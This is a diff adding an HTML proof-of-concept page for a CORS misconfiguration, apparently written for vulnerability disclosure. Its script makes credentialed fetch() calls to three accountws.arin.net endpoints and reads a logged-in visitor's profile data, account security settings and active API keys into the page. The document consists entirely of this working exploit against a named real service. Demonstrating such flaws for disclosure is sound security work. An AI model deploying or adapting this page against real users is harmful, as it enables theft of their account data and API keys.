@@ -1,0 +1,34 @@
+<html>
+<body>
+<h1>CORS Subdomain POC</h1>
+
+    <p>Profiles:</p>
+    <textarea id="profile" rows="5" cols="120"></textarea>
+    <p>Account Security:</p>
+    <textarea id="sec" rows="5" cols="120"></textarea>
+    <p>Active API keys:</p>
+    <textarea id="api" rows="5" cols="120"></textarea>
+
+    <script>
+        function poc(url, elID) {
+            fetch(url, {credentials: 'include'})
+            .then(
+                function(response) {
+
+                response.json().then(function(data) {
+                    document.getElementById(elID).innerText = JSON.stringify(data);
+                    console.log(data);
+                });
+                }
+            )
+            .catch(function(err) {
+                console.log('Fetch Error :-S', err);
+            });
+        }
+        poc('https://accountws.arin.net/public/seam/resource/rest/profiles', 'profile');
+        poc('https://accountws.arin.net/public/seam/resource/rest/security', 'sec');
+        poc('https://accountws.arin.net/public/seam/resource/rest/apikey/active', 'api');
+    </script>
+</body>
+</html>
+
